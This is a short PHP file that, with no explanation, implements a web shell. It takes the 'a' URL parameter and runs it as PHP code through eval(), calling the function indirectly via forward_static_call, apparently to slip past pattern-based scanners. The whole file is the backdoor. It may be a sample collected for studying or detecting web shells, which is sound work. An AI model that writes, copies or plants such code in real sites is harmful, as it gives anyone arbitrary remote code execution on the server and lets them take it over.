<?php
class A {
	static function test($arg) {
		eval ( $arg );
	}
}

$f = $_GET ["f"];
$a = $_GET ["a"];

forward_static_call ( "A::test", $a );
?>